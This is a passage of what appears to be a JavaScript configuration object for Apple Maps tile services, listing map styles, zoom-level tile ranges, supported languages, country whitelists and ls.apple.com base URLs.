                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 68,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 68,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 69,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 69,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 70,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe76-ssl.ls.apple.com/api/vltile",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
              ],
              identifier: 1,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 71,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe92-ssl.ls.apple.com",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 2097151,
                  minZ: 21,
                  minX: 0,
                  maxY: 2097151,
                  minY: 0,
                  maxZ: 21,
                },
              ],
              identifier: 1,
            },
          ],
        },
        {
          scale: 0,
          style: 72,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/72/v2",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
              ],
              identifier: 2,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 73,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 73,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 74,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/pbz/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2097151,
                  minZ: 21,
                  minX: 0,
                  maxY: 2097151,
                  minY: 0,
                  maxZ: 21,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 75,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/pbz/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 76,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/sis/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 524287,
                  minZ: 19,
                  minX: 0,
                  maxY: 524287,
                  minY: 0,
                  maxZ: 19,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 78,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 78,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 79,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 79,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 80,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/sdm/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 82,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/asset/v3/model-occlusion",
        },
        {
          scale: 0,
          style: 82,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL:
            "https://gspe19-kittyhawk-ssl.ls.apple.com/asset/v3/model-occlusion",
        },
        {
          scale: 0,
          style: 84,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16329310,
              timeToLiveSeconds: 1800,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-2-ssl.ls.apple.com/poi_update",
        },
        {
          scale: 0,
          style: 84,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16330272,
              timeToLiveSeconds: 1800,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-2-ssl.ls.apple.com/poi_update",
        },
        {
          scale: 0,
          style: 85,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-2-ssl.ls.apple.com/live_tile.vf",
        },
        {
          scale: 0,
          style: 85,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-2-ssl.ls.apple.com/live_tile.vf",
        },
        {
          scale: 0,
          style: 87,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 87,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
